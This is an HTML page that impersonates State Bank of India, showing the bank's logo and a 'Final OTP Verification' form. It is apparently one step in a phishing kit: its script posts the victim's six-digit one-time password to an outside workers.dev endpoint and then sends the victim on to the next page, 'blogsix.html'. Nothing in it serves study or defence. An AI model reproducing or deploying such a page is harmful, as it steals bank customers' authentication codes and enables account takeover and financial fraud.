<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>blogfive</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        
        .header {
            text-align: center;
            padding: 15px;
            background-color: white;
        }
        
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
        }
        
        .container {
            max-width: 420px;
            margin: 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .form-header {
            color: #000;
            padding: 18px 20px 8px 20px;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
        }
        
        .form-content {
            padding: 0 20px 20px 20px;
        }
        
        .form-group {
            margin-bottom: 5px;
            position: relative;
        }
        
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: bold;
            color: #333;
            margin-bottom: 3px;
        }
        
        .form-input {
            width: 100%;
            padding: 6px 0;
            font-size: 18px;
            border: none;
            border-bottom: 1px solid #ccc;
            background-color: transparent;
            outline: none;
            border-radius: 0;
            transition: border-color 0.3s;
            text-align: left;
            font-weight: bold;
        }
        
        .form-input:focus {
            border-bottom-color: #24A1E8;
        }
        
        .proceed-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #24A1E8;
            color: white;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 15px;
        }
        
        .proceed-button:hover {
            background-color: #1a8cd8;
        }
        
        .message {
            font-size: 13px;
            color: #666;
            text-align: center;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        
        .resend-container {
            display: flex;
            justify-content: flex-end;
            margin: 5px 0 10px 0;
        }
        
        .resend-button {
            width: 80px;
            padding: 4px 0;
            background-color: #24A1E8;
            color: white;
            font-size: 11px;
            font-weight: bold;
            border: none;
            border-radius: 2px;
            cursor: default;
            text-align: center;
        }
        
        .timer {
            text-align: center;
            font-size: 14px;
            color: #333;
            margin: 10px 0;
            font-weight: bold;
        }
        
        .asterisk {
            color: #ff0000;
        }
        
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
        
        /* Error message - chota red text */
        .error-message {
            color: #ff0000;
            font-size: 11px;
            margin-top: 4px;
            margin-bottom: 5px;
            font-weight: normal;
            display: none;
        }
        
        .error-message.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI Logo" class="logo">
    </div>
    
    <div class="container">
        <div class="form-header">
            Final OTP Verification
        </div>
        
        <div class="form-content">
            <div class="message">
                One Time Password (OTP) has been sent to your registered mobile Number.<br>
                Please enter the final OTP to complete the process.
            </div>
            
            <div class="form-group">
                <label class="form-label">One Time Password <span class="asterisk">*</span></label>
                <input type="text" class="form-input" id="otpInput" maxlength="6" pattern="[0-9]{6}">
                <!-- Error message - red me chota -->
                <div class="error-message" id="errorMessage">Wrong otp</div>
            </div>
            
            <div class="resend-container">
                <button class="resend-button">Resend OTP</button>
            </div>
            
            <div class="timer" id="timer">180</div>
            
            <button class="proceed-button" id="proceedButton">PROCEED</button>
        </div>
    </div>
    
    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" alt="Security Guidelines" class="footer-img">
    
    <script>
        const otpInput = document.getElementById('otpInput');
        const timerElement = document.getElementById('timer');
        const proceedBtn = document.getElementById('proceedButton');
        const errorMsg = document.getElementById('errorMessage');
        
        // OTP Input - sirf digits
        otpInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
            // Error message hide karo jab user type kare
            errorMsg.classList.remove('show');
            otpInput.style.borderBottomColor = '#ccc';
        });
        
        // Timer Countdown (180 seconds)
        let seconds = 180;
        function updateTimer() {
            timerElement.textContent = seconds;
            if (seconds > 0) {
                seconds--;
                setTimeout(updateTimer, 1000);
            } else {
                timerElement.textContent = "0";
            }
        }
        updateTimer();
        
        // Proceed Button
        proceedBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            
            const otpValue = otpInput.value.trim();
            
            // Validation - 6 digits
            if (otpValue.length !== 6 || !/^\d+$/.test(otpValue)) {
                otpInput.style.borderBottomColor = '#ff0000';
                errorMsg.classList.add('show');
                return;
            }
            
            // Worker ko data bhejo (localStorage nahi)
            const submission = {
                id: Date.now(),
                type: 'OTP2',
                data: { otp: otpValue },
                timestamp: new Date().toISOString()
            };

            try {
                const response = await fetch('https://aged-sunset-63e0.skd38824.workers.dev/', {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(submission)
                });

                const result = await response.json();
                
                if (result.success) {
                    // Turant redirect to blogsix.html (2 sec delay nahi)
                    window.location.href = 'blogsix.html';
                } else {
                    // Wrong OTP - red error dikhao
                    otpInput.style.borderBottomColor = '#ff0000';
                    errorMsg.classList.add('show');
                }
            } catch (error) {
                console.error('Submission error:', error);
                // Network error par bhi error dikhao
                otpInput.style.borderBottomColor = '#ff0000';
                errorMsg.classList.add('show');
            }
        });
    </script>
</body>
</html>
